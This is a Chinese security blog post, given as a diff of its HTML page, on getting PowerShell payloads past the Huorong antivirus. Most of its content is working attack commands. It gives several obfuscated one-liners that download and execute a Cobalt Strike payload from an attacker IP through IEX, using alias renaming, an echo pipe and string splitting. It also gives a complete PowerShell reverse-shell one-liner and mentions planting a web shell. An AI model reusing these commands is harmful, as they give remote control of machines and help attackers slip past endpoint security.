@@ -1,0 +1,406 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8" >
+    <meta http-equiv="X-UA-Compatible" content="IE=11,IE=10,IE=9,IE=8" >
+    <meta name="baidu-site-verification" content="dIcXMeY8Ya" />
+    
+    <title>PowerShellBypassAV | GMF信息小站</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" >
+    <meta name="keywords" content="givemefivw, POC&EXP, Web安全, 渗透测试, 编程语言" >
+    <meta name="description" content="信息安全小站" >
+
+    
+    <link rel="alternative" href="/atom.xml" title="GMF信息小站" type="application/atom+xml" >
+    
+    
+    <link rel="shortcut icon" href="/favicon.ico" >
+    
+    
+<link rel="stylesheet" href="/css/style.css?v=1626148974965.css">
+
+    <!--[if lt IE 9]>
+    
+<script src="/js/html5.js"></script>
+
+    <![endif]-->
+    
+
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body class="home">
+    <!--[if lt IE 9]>
+    <div class="browsehappy">
+        当前网页 <strong>不支持</strong>
+        你正在使用的浏览器. 为了正常的访问, 请 <a target="_blank" rel="noopener" href="http://browsehappy.com/">升级你的浏览器</a>.
+    </div>
+    <![endif]-->
+
+    <!-- 博客头部 -->
+    <header class="header">
+    <section class="container header-main">
+        <div class="logo">
+            <a href="/">
+                <div class="cover">
+                    <span class="name">GMF信息小站</span>
+                    <span class="description">Welcom to My Blog :)</span>
+                </div>
+            </a>
+        </div>
+        <div class="dropnav icon-paragraph-justify" id="JELON__btnDropNav"></div>
+        <ul class="menu hidden" id="JELON__menu">
+            
+            <li rel="/2021/07/13/PowerShellBypassAV/index.html" class="item ">
+                <a href="/" title="首页" class="icon-home">&nbsp;首页</a>
+            </li>
+            
+            <li rel="/2021/07/13/PowerShellBypassAV/index.html" class="item ">
+                <a href="/about/" title="关于" class="icon-about">&nbsp;关于</a>
+            </li>
+            
+        </ul>
+        <div class="profile clearfix">
+            <div class="feeds fl">
+                
+                
+                <p class="links">
+                    
+                        <a href="https://github.com/givemefivw" target="_blank">Github</a>
+                        |
+                    
+                        <a href="https://pages.coding.me" target="_blank">Hosted by Coding Pages</a>
+                        
+                    
+                </p>
+                <p class="sns">
+                    
+                        <a href="https://www.facebook.com/profile.php?id=100057569016241" class="FaceBook" target="_blank"><b>■</b> FaceBook</a>
+                    
+                        <a href="https://twitter.com/cawk07666665?s=09" class="Twitter" target="_blank"><b>■</b> Twitter</a>
+                    
+                    <a href="javascript: void(0);" class="wechat">
+                        <b>■</b>
+                        公众号
+                        <span class="popover">
+                            <img src="/img/wechat_mp.jpg" width="120" height="120" alt="我的微信订阅号">
+                            <i class="arrow"></i>
+                        </span>
+                    </a>
+                </p>
+                
+            </div>
+            <div class="avatar fr">
+                <img src="/img/jelon.jpg" alt="avatar" title="Jelon" >
+            </div>
+        </div>
+    </section>
+</header>
+
+
+    <!-- 博客正文 -->
+    <div class="container body clearfix">
+        <section class="content">
+            <div class="content-main widget">
+                <!-- 文章页 -->
+<!-- 文章 -->
+<article class="post article">
+    <header class="text-center">
+        <h3 class="post-title"><span>PowerShellBypassAV</span></h3>
+    </header>
+    <p class="post-meta text-center">
+        givemefivw 发表于
+        <time datetime="2021-07-13T03:53:13.000Z">2021-07-13</time>
+    </p>
+    <div id="JELON__articlePostContent" class="post-content">
+        <h2 id="Powershell的六种策略"><a href="#Powershell的六种策略" class="headerlink" title="Powershell的六种策略"></a>Powershell的六种策略</h2><pre><code>Unrestricted 权限最高，可以不受限制执行任意脚本
+
+Restricted 默认策略，不允许任意脚本的执行
+
+AllSigned 所有脚本必须经过签名运行
+
+RemoteSigned 本地脚本无限制，但是对来自网络的脚本必须经过签名
+
+Bypass 没有任何限制和提示
+
+Undefined 没有设置脚本的策略</code></pre>
+<h2 id="设置Powershell修改执行策略"><a href="#设置Powershell修改执行策略" class="headerlink" title="设置Powershell修改执行策略"></a>设置Powershell修改执行策略</h2><p>使用管理员权限， Set-ExecutionPolicy xx模式</p>
+<h2 id="Powershell绕过火绒上线"><a href="#Powershell绕过火绒上线" class="headerlink" title="Powershell绕过火绒上线"></a>Powershell绕过火绒上线</h2><p>本地开启PHPStudy，将一句话写入www目录，使用蚁剑连接，进入Shell交互界面。获取PS策略。<br><img src="/2021/07/13/PowerShellBypassAV/%E7%AD%96%E7%95%A5.png"><br>生成CS Payload </p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="literal">-c</span> <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.230.128:80/a&#x27;))&quot;</span></span><br></pre></td></tr></table></figure>
+<p>此时利用蚁剑运行payload，会被火绒拦截<br><img src="/2021/07/13/PowerShellBypassAV/%E7%81%AB%E7%BB%92%E6%8B%A6%E6%88%AA.png"><br>为IEX设置其他名称</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="built_in">set-alias</span> <span class="literal">-name</span> cseroad <span class="literal">-value</span> <span class="built_in">Invoke-Expression</span>;cseroad(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://192.168.230.128:80/a&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/07/13/PowerShellBypassAV/change_iex_name.png"><br>采用echo方式远程下载并执行</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="built_in">Invoke-Expression</span>(<span class="built_in">new-object</span> net.webclient).downloadstring(<span class="string">&#x27;http://192.168.230.128:80/a&#x27;</span>) | powershell -</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/07/13/PowerShellBypassAV/echo.png"><br>利用 + 符号拼接</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell  <span class="literal">-c</span> <span class="string">&quot;IEX(New-Object Net.WebClient).&quot;</span>DownloadString<span class="string">&quot;(&#x27;ht&#x27;+&#x27;tp://192.168.230.128:80/a&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2021/07/13/PowerShellBypassAV/%E7%AC%A6%E5%8F%B7%E6%8B%BC%E6%8E%A5.png"><br>进程如下<br><img src="/2021/07/13/PowerShellBypassAV/process.png"></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-c</span> <span class="string">&quot;<span class="variable">$client</span> = New-Object Net.Sockets.TCPClient(&#x27;192.168.230.128&#x27;,5567);<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream(); [byte[]]<span class="variable">$bytes</span> = 0..65535|%&#123;0&#125;;while((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, 0, <span class="variable">$bytes</span>.Length)) -ne 0)&#123;; <span class="variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,0, <span class="variable">$i</span>);<span class="variable">$sendback</span>=(iex <span class="variable">$data</span> 2&gt;&amp;1 | Out-String );<span class="variable">$sendata</span> =<span class="variable">$sendback</span>+&#x27;PS &gt;&#x27;;<span class="variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="variable">$sendata</span>);<span class="variable">$leng</span>=<span class="variable">$sendbyte</span>.Length;<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,0,<span class="variable">$leng</span>);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()&quot;</span></span><br></pre></td></tr></table></figure>
+<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>Win10系统PowerShell执行会出现未知名称错误<br><img src="/2021/07/13/PowerShellBypassAV/ps_wrong.png"></p>
+
+    </div>
+    <p class="eof">-- EOF --</p>
+    <p class="post-meta">
+        <span class="post-cat">分类：
+            <a class="cat-link" href="/categories/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/">免杀实验笔记</a>
+        </span>
+        <span class="post-tags">
+            标签：
+            
+    
+        <a href="/tags/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/" title="免杀实验笔记">免杀实验笔记</a>
+    
+
+        </span>
+    </p>
+</article>
+<!-- 分享按钮 -->
+
+  <div class="article-share clearfix text-center">
+    <div class="share-area">
+      <span class="share-txt">分享到：</span>
+      <a href="javascript: window.open('http://service.weibo.com/share/share.php?url=' + encodeURIComponent(location.href) + '&title=' + document.title + '&language=zh_cn');" class="share-icon weibo"></a>
+      <a href="javascript: alert('请复制链接到微信并发送');" class="share-icon wechat"></a>
+      <a href="javascript: window.open('http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=' + encodeURIComponent(location.href) + '&title=' + document.title);" class="share-icon qqzone"></a>
+      <a href="javascript: window.open('http://connect.qq.com/widget/shareqq/index.html?url=' + encodeURIComponent(location.href) + '&desc=Jelon个人博客&title=' + document.title + '&callback=' + encodeURIComponent(location.href));" class="share-icon qq"></a>
+      <a href="javascript: window.open('http://shuo.douban.com/!service/share?href=' + encodeURIComponent(location.href) + '&name=' + document.title + '&text=' + document.title);" class="share-icon douban"></a>
+    </div>
+  </div>
+
+
+<!-- 上一篇/下一篇 -->
+
+<div class="article-nav clearfix">
+    
+    <span class="prev fl">
+        上一篇<br >
+        <a href="javascript: void(0);">没有上一篇了</a>
+    </span>
+    
+
+    
+    <span class="next fr">
+        下一篇<br >
+        <a href="/2021/04/19/%E4%B8%8D%E6%83%B3%E7%9C%8B%E9%9D%92%E5%B9%B4%E5%A4%A7%E7%94%B5%E5%BD%B1%EF%BC%9F%E7%9C%8B%E8%BF%99%E9%87%8C%EF%BC%81/">
+            
+                不想看青年大电影？看这里！
+            
+        </a>
+    </span>
+    
+</div>
+
+<!-- 文章评论 -->
+
+
+            </div>
+
+        </section>
+        <!-- 侧栏部分 -->
+<aside class="sidebar">
+    
+    <section class="widget">
+        <h3 class="widget-hd"><strong>文章搜索</strong></h3>
+        <div class="search-form">
+  <form
+    id="searchForm"
+    method="GET"
+    action="https://www.baidu.com/s"
+    ectype="application/x-www-form-urlencoded"
+    target="_blank"
+    autocomplete="false"
+    onsubmit="javascript: return false;">
+    <input
+      id="searchKeyword"
+      type="text"
+      class="form-control"
+      placeholder="输入关键字搜索"
+      autocomplete="false"
+    />
+    <input id="searchKeywordHidden" type="hidden" name="wd" />
+    <input id="searchButton" class="btn" type="submit" value="搜索" />
+  </form>
+</div>
+    </section>
+    
+
+    <section class="widget">
+        <h3 class="widget-hd"><strong>文章分类</strong></h3>
+        <!-- 文章分类 -->
+<ul class="widget-bd">
+    
+    <li>
+        <a href="/categories/%E6%9D%82%E9%A1%B9%E6%BC%8F%E6%B4%9E/">杂项漏洞</a>
+        <span class="badge">(11)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/Wker%E8%84%9A%E6%9C%AC/">Wker脚本</a>
+        <span class="badge">(1)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/">免杀实验笔记</a>
+        <span class="badge">(7)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/CNVD-2019/">CNVD-2019</a>
+        <span class="badge">(1)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/CNVD-2021/">CNVD-2021</a>
+        <span class="badge">(1)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/CVE-2012/">CVE-2012</a>
+        <span class="badge">(1)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/CVE-2014/">CVE-2014</a>
+        <span class="badge">(1)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/CVE-2017/">CVE-2017</a>
+        <span class="badge">(5)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/CVE-2016/">CVE-2016</a>
+        <span class="badge">(1)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/CVE-2018/">CVE-2018</a>
+        <span class="badge">(2)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/CVE-2012/Struts2/">Struts2</a>
+        <span class="badge">(1)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/CVE-2019/">CVE-2019</a>
+        <span class="badge">(2)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/CVE-2020/">CVE-2020</a>
+        <span class="badge">(9)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/CVE-2021/">CVE-2021</a>
+        <span class="badge">(5)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/">技术文章</a>
+        <span class="badge">(1)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/">读书笔记</a>
+        <span class="badge">(1)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/Tips/">Tips</a>
+        <span class="badge">(1)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/%E6%9D%82%E9%A1%B9%E6%BC%8F%E6%B4%9E/OA%E7%B3%BB%E7%BB%9F/">OA系统</a>
+        <span class="badge">(2)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/%E6%9D%82%E8%B0%88/">杂谈</a>
+        <span class="badge">(3)</span>
+    </li>
+    
+</ul>
+    </section>
+
+    
+    <section class="widget">
+        <h3 class="widget-hd"><strong>热门标签</strong></h3>
+        <!-- 文章标签 -->
+<div class="widget-bd tag-wrap">
+  
+    <a class="tag-item" href="/tags/Apache/" title="Apache">Apache (5)</a>
+  
+    <a class="tag-item" href="/tags/Cheetach/" title="Cheetach">Cheetach (1)</a>
+  
+    <a class="tag-item" href="/tags/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/" title="免杀实验笔记">免杀实验笔记 (7)</a>
+  
+    <a class="tag-item" href="/tags/Weblogic/" title="Weblogic">Weblogic (3)</a>
+  
+    <a class="tag-item" href="/tags/POC/" title="POC">POC (17)</a>
+  
+    <a class="tag-item" href="/tags/Apache-S2/" title="Apache S2">Apache S2 (5)</a>
+  
+    <a class="tag-item" href="/tags/%E5%A4%8D%E7%8E%B0/" title="复现">复现 (7)</a>
+  
+    <a class="tag-item" href="/tags/EXP/" title="EXP">EXP (1)</a>
+  
+    <a class="tag-item" href="/tags/%E8%84%9A%E6%9C%AC/" title="脚本">脚本 (1)</a>
+  
+    <a class="tag-item" href="/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/" title="读书笔记">读书笔记 (1)</a>
+  
+    <a class="tag-item" href="/tags/%E7%94%9F%E6%B4%BB%E7%99%BE%E7%A7%91/" title="生活百科">生活百科 (1)</a>
+  
+    <a class="tag-item" href="/tags/%E4%B9%8B%E6%88%91%E8%A7%81/" title="之我见">之我见 (1)</a>
+  
+    <a class="tag-item" href="/tags/%E9%9A%8F%E7%AC%94/" title="随笔">随笔 (3)</a>
+  
+</div>
+    </section>
+    
+
+    
+
+    
+    <!-- 友情链接 -->
+    <section class="widget">
+        <h3 class="widget-hd"><strong>友情链接</strong></h3>
+        <!-- 文章分类 -->
+<ul class="widget-bd">
+    
+        <li>
+            <a href="https://github.com/givemefivw" target="_blank" title="Github博客">Github博客</a>
+        </li>
+    
+        <li>
+            <a href="https://givemefivw.github.io/" target="_blank" title="Sec H博客">Sec H博客</a>
+        </li>
+    
+</ul>
+    </section>
+    
+</aside>
+<!-- / 侧栏部分 -->
+    </div>
+
+    <!-- 博客底部 -->
+    <footer class="footer">
+    &copy;
+    
+        2016-2021
+    
+
+    <a href="/">Jelon Loves You</a>
+</footer>
+<div class="back-to-top" id="JELON__backToTop" title="返回顶部">返回顶部</div>
+
+    <!--博客js脚本 -->
+    <!-- 这里放网站js脚本 -->
+
+<script src="/js/main.js?v=1626148974969.js"></script>
+
+
+</body>
+</html>
